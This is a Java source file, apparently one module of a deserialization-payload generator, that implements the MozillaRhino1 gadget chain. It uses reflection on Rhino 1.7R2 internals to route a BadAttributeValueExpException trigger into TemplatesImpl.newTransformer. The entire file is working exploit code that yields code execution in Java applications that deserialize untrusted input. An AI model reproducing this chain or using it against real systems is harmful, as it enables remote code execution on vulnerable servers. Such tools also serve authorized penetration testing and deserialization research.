package com.ppp.chain.mozillarhino;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;

import java.lang.reflect.Method;

/*
    by @matthias_kaiser
*/
@Dependencies({"rhino:js:1.7R2"})
@Authors({Authors.MATTHIASKAISER})
@Sink({Sink.TemplatesImpl})
public class MozillaRhino1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        IdScriptableObject idScriptableObject = (IdScriptableObject) Reflections.newInstance("org.mozilla.javascript.NativeError");

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        Reflections.setAccessible(getSlot);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);

        Object memberboxes = Reflections.newInstance("org.mozilla.javascript.MemberBox", enterMethod);
        Reflections.setFieldValue(slot, "getter", memberboxes);


        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, templates, TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        return KickOff.badAttributeValueExpException(idScriptableObject);
    }
}
